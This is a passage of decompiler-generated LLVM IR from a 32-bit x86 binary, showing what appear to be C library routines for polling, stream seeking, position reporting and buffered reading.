  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_80584a4.184, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051048, { 1, 0 }
}

define i32 @function_8051050() local_unnamed_addr {
dec_label_pc_8051050:
  %v0_8051053 = load i32, i32* @eax, align 4
  %v1_8051055 = sub i32 0, %v0_8051053
  %v1_8051057 = call i32 @function_804b7f4(i32 ptrtoint (i32* @0 to i32))
  %v2_805105c = inttoptr i32 %v1_8051057 to i32*
  store i32 %v1_8051055, i32* %v2_805105c, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 12, 13, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
}

define i32 @function_8051068() local_unnamed_addr {
dec_label_pc_8051068:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051068 = load i32, i32* @edi, align 4
  store i32 %v0_8051068, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8051078 = load i32, i32* @ebx, align 4
  %v1_8051079 = inttoptr i32 %tmp4 to %pollfd*
  %v5_8051080 = call i32 @poll(%pollfd* %v1_8051079, i32 %tmp3, i32 %tmp)
  store i32 %v0_8051078, i32* @ebx, align 4
  store i32 %v5_8051080, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8051080, -4095
  br i1 %tmp10, label %dec_label_pc_8051098, label %dec_label_pc_805108c

dec_label_pc_805108c:                             ; preds = %dec_label_pc_8051068
  %v1_805108c = call i32 @function_804b7f4(i32 %v0_8051078)
  %v0_8051091 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051091 = sub i32 0, %v0_8051091
  %v2_8051093 = inttoptr i32 %v1_805108c to i32*
  store i32 %v1_8051091, i32* %v2_8051093, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051098

dec_label_pc_8051098:                             ; preds = %dec_label_pc_8051068, %dec_label_pc_805108c
  %v0_8051099 = phi i32 [ %v5_8051080, %dec_label_pc_8051068 ], [ -1, %dec_label_pc_805108c ]
  %v2_805109c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805109c, i32* @edi, align 4
  ret i32 %v0_8051099

; uselistorder directives
  uselistorder i32 %v5_8051080, { 1, 0, 2 }
  uselistorder i32 %v0_8051078, { 1, 0 }
  uselistorder label %dec_label_pc_8051098, { 1, 0 }
}

define i32 @function_80510a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80510a0:
  %v1_80510ab = ashr i32 %arg2, 31
  %v4_80510b2 = inttoptr i32 %arg1 to i16*
  %v5_80510b2 = call i32 @function_80510bc(i16* %v4_80510b2, i32 %arg2, i32 %v1_80510ab, i32 %arg3)
  ret i32 %v5_80510b2
}

define i32 @function_80510bc(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80510bc:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80510bc = load i32, i32* @ebp, align 4
  %v0_80510bd = load i32, i32* @edi, align 4
  %v0_80510be = load i32, i32* @esi, align 4
  %v0_80510bf = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_80510cf = ptrtoint i16* %arg1 to i32
  store i32 %v4_80510cf, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_80510f3, label %dec_label_pc_80510e0

dec_label_pc_80510e0:                             ; preds = %dec_label_pc_80510bc
  %v1_80510e0 = call i32 @function_804b7f4(i32 %arg2)
  store i32 %v1_80510e0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_80510e8 = inttoptr i32 %v1_80510e0 to i32*
  store i32 22, i32* %v1_80510e8, align 4
  br label %dec_label_pc_8051199

dec_label_pc_80510f3:                             ; preds = %dec_label_pc_80510bc
  %v1_80510f3 = add i32 %v4_80510cf, 52
  %v2_80510f3 = inttoptr i32 %v1_80510f3 to i32*
  %v3_80510f3 = load i32, i32* %v2_80510f3, align 4
  %v1_80510f6 = icmp eq i32 %v3_80510f3, 0
  %v1_80510f8 = icmp eq i1 %v1_80510f6, false
  br i1 %v1_80510f8, label %dec_label_pc_8051119, label %dec_label_pc_80510fa

dec_label_pc_80510fa:                             ; preds = %dec_label_pc_80510f3
  %v1_80510fa = add i32 %v4_80510cf, 56
  store i32 %v1_80510fa, i32* @ebx, align 4
  %v2_8051104 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8051104, i32* @eax, align 4
  %v3_8051109 = call i32 @function_804f016(i32 %v2_8051104, i32 134541331)
  store i32 %v3_8051109, i32* %eax.global-to-local, align 4
  %v0_805110e = load i32, i32* @ebx, align 4
  %v2_8051111 = call i32 @function_804f013(i32 %v0_805110e)
  store i32 %v2_8051111, i32* %eax.global-to-local, align 4
  %v0_8051119.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051119

dec_label_pc_8051119:                             ; preds = %dec_label_pc_80510f3, %dec_label_pc_80510fa
  %v0_8051121 = phi i32 [ %v4_80510cf, %dec_label_pc_80510f3 ], [ %v0_8051119.pre, %dec_label_pc_80510fa ]
  %v1_8051119 = inttoptr i32 %v0_8051121 to i8*
  %v2_8051119 = load i8, i8* %v1_8051119, align 1
  %v3_8051119 = and i8 %v2_8051119, 64
  %v4_8051119 = icmp eq i8 %v3_8051119, 0
  br i1 %v4_8051119, label %dec_label_pc_805112e, label %dec_label_pc_805111e

dec_label_pc_805111e:                             ; preds = %dec_label_pc_8051119
  %v2_8051122 = call i32 @function_804c010(i32 %v0_8051121)
  store i32 %v2_8051122, i32* %eax.global-to-local, align 4
  %v1_805112a = icmp eq i32 %v2_8051122, 0
  %v1_805112c = icmp eq i1 %v1_805112a, false
  br i1 %v1_805112c, label %dec_label_pc_8051181, label %dec_label_pc_805112e

dec_label_pc_805112e:                             ; preds = %dec_label_pc_805111e, %dec_label_pc_8051119
  %v0_805112e = load i32, i32* @edi, align 4
  %v9_805112e = icmp eq i32 %v0_805112e, 1
  %v1_8051131 = icmp eq i1 %v9_805112e, false
  br i1 %v1_8051131, label %dec_label_pc_805112e.dec_label_pc_8051147_crit_edge, label %dec_label_pc_8051133

dec_label_pc_805112e.dec_label_pc_8051147_crit_edge: ; preds = %dec_label_pc_805112e
  %.pre5 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8051147

dec_label_pc_8051133:                             ; preds = %dec_label_pc_805112e
  %v0_8051133 = load i32, i32* @ecx, align 4
  %v2_8051135 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8051135, i32* %eax.global-to-local, align 4
  %v0_805113a = load i32, i32* @esi, align 4
  %v5_805113a = inttoptr i32 %v0_805113a to i16*
  %v6_805113b = call i32 @function_80511f4(i16* %v5_805113a, i32 %v2_8051135, i32 %v0_8051133, i32 %v0_8051133)
  store i32 %v6_805113b, i32* %eax.global-to-local, align 4
  %v2_8051143 = icmp slt i32 %v6_805113b, 0
  br i1 %v2_8051143, label %dec_label_pc_8051181, label %dec_label_pc_8051133.dec_label_pc_8051147_crit_edge

dec_label_pc_8051133.dec_label_pc_8051147_crit_edge: ; preds = %dec_label_pc_8051133
  %v0_8051148.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051147

dec_label_pc_8051147:                             ; preds = %dec_label_pc_805112e.dec_label_pc_8051147_crit_edge, %dec_label_pc_8051133.dec_label_pc_8051147_crit_edge
  %v2_8051149.pre-phi = phi i32 [ %.pre5, %dec_label_pc_805112e.dec_label_pc_8051147_crit_edge ], [ %v2_8051135, %dec_label_pc_8051133.dec_label_pc_8051147_crit_edge ]
  %v0_8051148 = phi i32 [ %v0_805112e, %dec_label_pc_805112e.dec_label_pc_8051147_crit_edge ], [ %v0_8051148.pre, %dec_label_pc_8051133.dec_label_pc_8051147_crit_edge ]
  %v0_8051147 = load i32, i32* @edx, align 4
  store i32 %v2_8051149.pre-phi, i32* %eax.global-to-local, align 4
  %v0_805114e = load i32, i32* @esi, align 4
  %v5_805114f = inttoptr i32 %v2_8051149.pre-phi to i32*
  %v6_805114f = call i32 @function_8051330(i32 %v0_805114e, i32* %v5_805114f, i32 %v0_8051148, i32 %v0_8051147)
  store i32 %v6_805114f, i32* %eax.global-to-local, align 4
  %v2_8051157 = icmp slt i32 %v6_805114f, 0
  br i1 %v2_8051157, label %dec_label_pc_8051181, label %dec_label_pc_805115b

dec_label_pc_805115b:                             ; preds = %dec_label_pc_8051147
  %v0_805115b = load i32, i32* @esi, align 4
  %v1_805115b = inttoptr i32 %v0_805115b to i32*
  %v2_805115b = load i32, i32* %v1_805115b, align 4
  store i32 %v2_805115b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805115f = add i32 %v0_805115b, 44
  %v2_805115f = inttoptr i32 %v1_805115f to i32*
  store i32 0, i32* %v2_805115f, align 4
  %v0_8051166 = load i32, i32* @esi, align 4
  %v1_8051166 = add i32 %v0_8051166, 2
  %v2_8051166 = inttoptr i32 %v1_8051166 to i8*
  store i8 0, i8* %v2_8051166, align 1
  %v0_805116a = load i32, i32* %eax.global-to-local, align 4
  %v1_805116a = and i32 %v0_805116a, -72
  store i32 %v1_805116a, i32* %eax.global-to-local, align 4
  %v1_805116d = trunc i32 %v1_805116a to i16
  %v2_805116d = load i32, i32* @esi, align 4
  %v3_805116d = inttoptr i32 %v2_805116d to i16*
  store i16 %v1_805116d, i16* %v3_805116d, align 2
  %v0_8051170 = load i32, i32* @esi, align 4
  %v1_8051170 = add i32 %v0_8051170, 8
  %v2_8051170 = inttoptr i32 %v1_8051170 to i32*
  %v3_8051170 = load i32, i32* %v2_8051170, align 4
  store i32 %v3_8051170, i32* %eax.global-to-local, align 4
  %v2_8051173 = add i32 %v0_8051170, 16
  %v3_8051173 = inttoptr i32 %v2_8051173 to i32*
  store i32 %v3_8051170, i32* %v3_8051173, align 4
  %v0_8051176 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051176 = load i32, i32* @esi, align 4
  %v2_8051176 = add i32 %v1_8051176, 20
  %v3_8051176 = inttoptr i32 %v2_8051176 to i32*
  store i32 %v0_8051176, i32* %v3_8051176, align 4
  %v0_8051179 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051179 = load i32, i32* @esi, align 4
  %v2_8051179 = add i32 %v1_8051179, 24
  %v3_8051179 = inttoptr i32 %v2_8051179 to i32*
  store i32 %v0_8051179, i32* %v3_8051179, align 4
  %v0_805117c = load i32, i32* %eax.global-to-local, align 4
  %v1_805117c = load i32, i32* @esi, align 4
  %v2_805117c = add i32 %v1_805117c, 28
  %v3_805117c = inttoptr i32 %v2_805117c to i32*
  store i32 %v0_805117c, i32* %v3_805117c, align 4
  br label %dec_label_pc_8051184

dec_label_pc_8051181:                             ; preds = %dec_label_pc_8051147, %dec_label_pc_8051133, %dec_label_pc_805111e
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051184

dec_label_pc_8051184:                             ; preds = %dec_label_pc_805115b, %dec_label_pc_8051181
  br i1 %v1_80510f8, label %dec_label_pc_8051199, label %dec_label_pc_8051188

dec_label_pc_8051188:                             ; preds = %dec_label_pc_8051184
  %v2_805118c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805118c, i32* @eax, align 4
  %v3_8051191 = call i32 @function_804f016(i32 %v2_805118c, i32 1)
  store i32 %v3_8051191, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051199

dec_label_pc_8051199:                             ; preds = %dec_label_pc_8051184, %dec_label_pc_80510e0, %dec_label_pc_8051188
  %v0_805119c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805119c, i32* %eax.global-to-local, align 4
  store i32 %v0_80510bf, i32* @ebx, align 4
  store i32 %v0_80510be, i32* @esi, align 4
  store i32 %v0_80510bd, i32* @edi, align 4
  store i32 %v0_80510bc, i32* @ebp, align 4
  ret i32 %v0_805119c

; uselistorder directives
  uselistorder i32 %v2_8051149.pre-phi, { 1, 0 }
  uselistorder i32 %v0_805112e, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i8 64, { 5, 1, 2, 6, 3, 4, 0 }
  uselistorder i32 (i32)* @function_804f013, { 9, 28, 27, 7, 6, 5, 26, 25, 3, 29, 35, 34, 12, 2, 1, 0, 11, 10, 24, 23, 22, 21, 20, 19, 8, 18, 33, 4, 17, 16, 32, 31, 30, 15, 14, 13 }
  uselistorder i32 (i32, i32)* @function_804f016, { 10, 9, 49, 48, 47, 46, 7, 6, 5, 4, 3, 2, 45, 44, 43, 42, 1, 0, 51, 50, 63, 62, 61, 60, 16, 15, 14, 13, 12, 11, 41, 40, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 39, 8, 28, 27, 59, 58, 26, 25, 24, 23, 57, 56, 55, 54, 53, 52, 22, 21, 20, 19, 18, 17 }
  uselistorder i32 134541331, { 2, 3, 29, 30, 31, 32, 33, 34, 0, 19, 4, 5, 6, 7, 8, 9, 10, 1, 20, 21, 22, 11, 23, 12, 13, 14, 15, 24, 25, 26, 27, 16, 28, 17, 18 }
  uselistorder i32 52, { 16, 2, 8, 3, 4, 5, 6, 14, 15, 9, 11, 7, 17, 18, 12, 13, 1, 0, 10 }
  uselistorder i32 22, { 9, 12, 8, 0, 1, 2, 3, 6, 10, 11, 7, 4, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051199, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051184, { 1, 0 }
  uselistorder label %dec_label_pc_8051147, { 1, 0 }
  uselistorder label %dec_label_pc_8051119, { 1, 0 }
}

define i32 @function_80511a4(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80511a4:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80511a4 = load i32, i32* @ebx, align 4
  store i32 %v0_80511a4, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_80511aa = ptrtoint i16* %arg1 to i32
  store i32 %v4_80511aa, i32* @ebx, align 4
  %v1_80511b2 = bitcast i16* %arg1 to i8*
  %v2_80511b2 = load i8, i8* %v1_80511b2, align 1
  %v3_80511b2 = and i8 %v2_80511b2, 4
  %v4_80511b2 = icmp eq i8 %v3_80511b2, 0
  %v1_80511b5 = icmp eq i1 %v4_80511b2, false
  br i1 %v1_80511b5, label %dec_label_pc_80511ed, label %dec_label_pc_80511b7

dec_label_pc_80511b7:                             ; preds = %dec_label_pc_80511a4
  %v2_80511b7 = icmp slt i32 %arg3, 0
  %v3_80511be = select i1 %v2_80511b7, i32 2147483647, i32 %arg3
  %v1_80511c7 = add i32 %v4_80511aa, 4
  %v2_80511c7 = inttoptr i32 %v1_80511c7 to i32*
  %v3_80511c7 = load i32, i32* %v2_80511c7, align 4
  %v4_80511ca = inttoptr i32 %arg2 to i32*
  %v5_80511ca = call i32 @function_8051fa8(i32 %v3_80511c7, i32* %v4_80511ca, i32 %v3_80511be, i32 2147483647)
  store i32 %v5_80511ca, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v5_80511ca, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_80511ed, label %dec_label_pc_80511d9

dec_label_pc_80511d9:                             ; preds = %dec_label_pc_80511b7
  %v1_80511d2 = icmp eq i32 %v5_80511ca, 0
  %v4_80511d7 = icmp eq i1 %v1_80511d2, false
  %v0_80511d9 = load i32, i32* @ebx, align 4
  %v1_80511d9 = inttoptr i32 %v0_80511d9 to i32*
  %v2_80511d9 = load i32, i32* %v1_80511d9, align 4
  br i1 %v4_80511d7, label %dec_label_pc_80511e5, label %dec_label_pc_80511dd

dec_label_pc_80511dd:                             ; preds = %dec_label_pc_80511d9
  %v1_80511dd = or i32 %v2_80511d9, 4
  %v1_80511e0 = trunc i32 %v1_80511dd to i16
  %v3_80511e0 = inttoptr i32 %v0_80511d9 to i16*
  store i16 %v1_80511e0, i16* %v3_80511e0, align 2
  br label %dec_label_pc_80511ed

dec_label_pc_80511e5:                             ; preds = %dec_label_pc_80511d9
  %v1_80511e5 = or i32 %v2_80511d9, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_80511ea = trunc i32 %v1_80511e5 to i16
  %v3_80511ea = inttoptr i32 %v0_80511d9 to i16*
  store i16 %v1_80511ea, i16* %v3_80511ea, align 2
  br label %dec_label_pc_80511ed

dec_label_pc_80511ed:                             ; preds = %dec_label_pc_80511b7, %dec_label_pc_80511a4, %dec_label_pc_80511dd, %dec_label_pc_80511e5
  %v0_80511ee = load i32, i32* %ecx.global-to-local, align 4
  %v2_80511f1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80511f1, i32* @ebx, align 4
  ret i32 %v0_80511ee

; uselistorder directives
  uselistorder i32 %v5_80511ca, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 2147483647, { 0, 3, 1, 2, 4 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80511ed, { 3, 2, 0, 1 }
}

define i32 @function_80511f4(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80511f4:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_80511fc = ptrtoint i16* %arg1 to i32
  store i32 %v4_80511fc, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8051204 = load i16, i16* %arg1, align 2
  %v3_8051204 = zext i16 %v2_8051204 to i32
  store i32 %v3_8051204, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_8051204, 4
  %v1_8051209 = zext i16 %tmp to i32
  %v2_8051209 = icmp eq i16 %tmp, 0
  br i1 %v2_8051209, label %dec_label_pc_8051238, label %dec_label_pc_805120e

dec_label_pc_805120e:                             ; preds = %dec_label_pc_80511f4
  %v1_8051210 = add nsw i32 %v1_8051209, -1
  %v8_8051210 = icmp eq i32 %v1_8051210, 0
  store i32 %v1_8051210, i32* @edx, align 4
  br i1 %v8_8051210, label %dec_label_pc_8051238, label %dec_label_pc_8051213

dec_label_pc_8051213:                             ; preds = %dec_label_pc_805120e
  %v3_8051213 = and i32 %v3_8051204, 2048
  %v4_8051213 = icmp eq i32 %v3_8051213, 0
  br i1 %v4_8051213, label %dec_label_pc_8051238, label %dec_label_pc_8051218

dec_label_pc_8051218:                             ; preds = %dec_label_pc_8051213
  %v6_8051218 = sub nsw i32 1, %v1_8051209
  %v7_8051218 = and i32 %v1_8051210, %v6_8051218
  %v8_8051218 = icmp slt i32 %v7_8051218, 0
  %v9_8051218 = icmp eq i16 %tmp, 2
  %v10_8051218 = icmp ult i16 %tmp, 2
  %v3_805121b = icmp eq i1 %v10_8051218, %v8_8051218
  %v4_805121b = icmp eq i1 %v9_8051218, false
  %v5_805121b = and i1 %v4_805121b, %v3_805121b
  br i1 %v5_805121b, label %dec_label_pc_805128c, label %dec_label_pc_805121d

dec_label_pc_805121d:                             ; preds = %dec_label_pc_8051218
  %v1_805121d = add i32 %v4_80511fc, 40
  %v2_805121d = inttoptr i32 %v1_805121d to i32*
  %v3_805121d = load i32, i32* %v2_805121d, align 4
  %v4_805121d = icmp eq i32 %v3_805121d, 0
  %v1_8051221 = icmp eq i1 %v4_805121d, false
  br i1 %v1_8051221, label %dec_label_pc_805128c, label %dec_label_pc_8051223

dec_label_pc_8051223:                             ; preds = %dec_label_pc_805121d
  %v1_8051223 = add i32 %v4_80511fc, 3
  %v2_8051223 = inttoptr i32 %v1_8051223 to i8*
  %v3_8051223 = load i8, i8* %v2_8051223, align 1
  %v4_8051223 = zext i8 %v3_8051223 to i32
  %v2_8051227 = sub nsw i32 %v1_8051210, %v4_8051223
  %v1_8051229 = add i32 %v4_80511fc, 44
  %v2_8051229 = inttoptr i32 %v1_8051229 to i32*
  %v3_8051229 = load i32, i32* %v2_8051229, align 4
  %v1_805122d = add nsw i32 %v2_8051227, -1
  %tmp11 = icmp slt i32 %v3_8051229, 1
  br i1 %tmp11, label %dec_label_pc_8051238, label %dec_label_pc_8051232

dec_label_pc_8051232:                             ; preds = %dec_label_pc_8051223
  %v1_8051232 = add i32 %v4_80511fc, 2
  %v2_8051232 = inttoptr i32 %v1_8051232 to i8*
  %v3_8051232 = load i8, i8* %v2_8051232, align 1
  %v4_8051232 = zext i8 %v3_8051232 to i32
  %v2_8051236 = sub nsw i32 %v1_805122d, %v4_8051232
  br label %dec_label_pc_8051238

dec_label_pc_8051238:                             ; preds = %dec_label_pc_8051223, %dec_label_pc_8051213, %dec_label_pc_805120e, %dec_label_pc_80511f4, %dec_label_pc_8051232
  %v0_805124d = phi i32 [ %v1_805122d, %dec_label_pc_8051223 ], [ %v1_8051210, %dec_label_pc_8051213 ], [ 0, %dec_label_pc_805120e ], [ 0, %dec_label_pc_80511f4 ], [ %v2_8051236, %dec_label_pc_8051232 ]
  %v2_8051238 = and i32 %v3_8051204, 64
  %v3_8051238 = icmp eq i32 %v2_8051238, 0
  %storemerge.in.in.v = select i1 %v3_8051238, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_80511fc
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8051245 = add i32 %v4_80511fc, 16
  %v3_8051245 = inttoptr i32 %v2_8051245 to i32*
  %v4_8051245 = load i32, i32* %v3_8051245, align 4
  %v5_8051245 = sub i32 %storemerge, %v4_8051245
  %v1_8051248 = inttoptr i32 %arg2 to i32*
  %v2_8051248 = load i32, i32* %v1_8051248, align 4
  store i32 %v2_8051248, i32* %ecx.global-to-local, align 4
  %v1_805124a = add i32 %arg2, 4
  %v2_805124a = inttoptr i32 %v1_805124a to i32*
  %v3_805124a = load i32, i32* %v2_805124a, align 4
  store i32 %v3_805124a, i32* %ebx.global-to-local, align 4
  %v2_805124d = add i32 %v5_8051245, %v0_805124d
  store i32 %v2_805124d, i32* %esi.global-to-local, align 4
  %v5_8051261 = sub i32 %v2_8051248, %v2_805124d
  %v10_8051261 = icmp ult i32 %v2_8051248, %v2_805124d
  %v6_8051265 = zext i1 %v10_8051261 to i32
  %tmp13 = icmp slt i32 %v2_805124d, 0
  %v2_8051252.neg = zext i1 %tmp13 to i32
  %v7_8051265 = add i32 %v3_805124a, %v2_8051252.neg
  %v8_8051265 = add i32 %v7_8051265, %v6_8051265
  store i32 %v8_8051265, i32* @edx, align 4
  store i32 %v5_8051261, i32* %v1_8051248, align 4
  %v0_805126b = load i32, i32* @edx, align 4
  %v1_805126b = load i32, i32* %edi.global-to-local, align 4
  %v2_805126b = add i32 %v1_805126b, 4
  %v3_805126b = inttoptr i32 %v2_805126b to i32*
  store i32 %v0_805126b, i32* %v3_805126b, align 4
  %v0_805126e = load i32, i32* %edi.global-to-local, align 4
  %v1_805126e = add i32 %v0_805126e, 4
  %v2_805126e = inttoptr i32 %v1_805126e to i32*
  %v3_805126e = load i32, i32* %v2_805126e, align 4
  %v4_805126e = load i32, i32* %ebx.global-to-local, align 4
  %v5_8051271 = icmp slt i32 %v3_805126e, %v4_805126e
  br i1 %v5_8051271, label %dec_label_pc_805127b, label %dec_label_pc_8051273

dec_label_pc_8051273:                             ; preds = %dec_label_pc_8051238
  %v8_8051273 = icmp sgt i32 %v3_805126e, %v4_805126e
  br i1 %v8_8051273, label %dec_label_pc_8051279, label %dec_label_pc_8051275

dec_label_pc_8051275:                             ; preds = %dec_label_pc_8051273
  %v1_8051275 = inttoptr i32 %v0_805126e to i32*
  %v2_8051275 = load i32, i32* %v1_8051275, align 4
  %v3_8051275 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8051275, %v3_8051275
  br i1 %tmp14, label %dec_label_pc_8051279, label %dec_label_pc_805127b

dec_label_pc_8051279:                             ; preds = %dec_label_pc_8051275, %dec_label_pc_8051273
  %v0_8051279 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051279 = sub i32 0, %v0_8051279
  store i32 %v1_8051279, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805127b

dec_label_pc_805127b:                             ; preds = %dec_label_pc_8051275, %dec_label_pc_8051238, %dec_label_pc_8051279
  %v0_805127b = load i32, i32* %esi.global-to-local, align 4
  %v2_805127b = icmp slt i32 %v0_805127b, 0
  %v1_805127d = icmp eq i1 %v2_805127b, false
  br i1 %v1_805127d, label %dec_label_pc_805128f, label %dec_label_pc_805127f

dec_label_pc_805127f:                             ; preds = %dec_label_pc_805127b
  %v1_805127f = call i32 @function_804b7f4(i32 %v2_805124d)
  %v1_8051284 = inttoptr i32 %v1_805127f to i32*
  store i32 75, i32* %v1_8051284, align 4
  %v0_8051292.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805128f

dec_label_pc_805128c:                             ; preds = %dec_label_pc_805121d, %dec_label_pc_8051218
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805128f

dec_label_pc_805128f:                             ; preds = %dec_label_pc_805127b, %dec_label_pc_805127f, %dec_label_pc_805128c
  %v0_8051292 = phi i32 [ %v0_805127b, %dec_label_pc_805127b ], [ %v0_8051292.pre, %dec_label_pc_805127f ], [ -1, %dec_label_pc_805128c ]
  ret i32 %v0_8051292

; uselistorder directives
  uselistorder i32 %v4_805126e, { 1, 0 }
  uselistorder i32 %v3_805126e, { 1, 0 }
  uselistorder i32 %v2_805124d, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_8051210, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_80511fc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i16 2, { 0, 1, 4, 2, 3 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805128f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805127b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051238, { 4, 0, 1, 2, 3 }
}

define i32 @function_8051298(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051298:
  %edx.global-to-local = alloca i32, align 4
  %v0_8051298 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80512a0 = add i32 %arg1, 8
  %v2_80512a0 = inttoptr i32 %v1_80512a0 to i32*
  %v3_80512a0 = load i32, i32* %v2_80512a0, align 4
  store i32 %v3_80512a0, i32* %edx.global-to-local, align 4
  %v1_80512a3 = add i32 %arg1, 12
  %v2_80512a3 = inttoptr i32 %v1_80512a3 to i32*
  %v3_80512a3 = load i32, i32* %v2_80512a3, align 4
  %v2_80512a6 = sub i32 %v3_80512a3, %v3_80512a0
  %v3_80512ab = inttoptr i32 %arg1 to i16*
  %v4_80512ab = call i32 @function_80511a4(i16* %v3_80512ab, i32 %v3_80512a0, i32 %v2_80512a6)
  %v0_80512b0 = load i32, i32* @ebx, align 4
  %v1_80512b0 = add i32 %v0_80512b0, 8
  %v2_80512b0 = inttoptr i32 %v1_80512b0 to i32*
  %v3_80512b0 = load i32, i32* %v2_80512b0, align 4
  store i32 %v3_80512b0, i32* %edx.global-to-local, align 4
  %v2_80512b3 = add i32 %v0_80512b0, 16
  %v3_80512b3 = inttoptr i32 %v2_80512b3 to i32*
  store i32 %v3_80512b0, i32* %v3_80512b3, align 4
  %v0_80512b6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80512b6 = add i32 %v0_80512b6, %v4_80512ab
  store i32 %v2_80512b6, i32* %edx.global-to-local, align 4
  %v1_80512b8 = load i32, i32* @ebx, align 4
  %v2_80512b8 = add i32 %v1_80512b8, 20
  %v3_80512b8 = inttoptr i32 %v2_80512b8 to i32*
  store i32 %v2_80512b6, i32* %v3_80512b8, align 4
  store i32 %v0_8051298, i32* @ebx, align 4
  ret i32 %v4_80512ab

; uselistorder directives
  uselistorder i32 %v4_80512ab, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @function_80512c0(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80512c0:
  %stack_var_-12 = alloca i32, align 4
  %v0_80512c0 = load i32, i32* @ebx, align 4
  %v4_80512c4 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80512c4, i32* @ebx, align 4
  %v2_80512cc = load i16, i16* %arg1, align 2
  %v3_80512cc = zext i16 %v2_80512cc to i32
  %v2_80512cf = and i32 %v3_80512cc, %arg2
  %v3_80512cf = icmp eq i32 %v2_80512cf, 0
